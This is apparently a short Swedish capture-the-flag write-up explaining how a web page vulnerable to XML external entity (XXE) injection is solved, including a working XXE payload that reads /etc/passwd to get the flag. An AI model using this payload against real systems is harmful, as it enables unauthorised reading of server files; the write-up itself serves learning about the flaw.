# XML-kontroll

En webbsida som är sårbar för XML eXternal Entity (XXE)-injektion: https://en.wikipedia.org/wiki/XML_external_entity_attack

Ett av exemplen på Wikipedia visar hur man kan läsa ut `/etc/passwd`. Att använda det rakt av ger felet `Unicode strings with encoding declaration are not supported`, men genom att ta bort `encoding=`-attributet likt nedan får man ut flaggan:
```xml
<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```
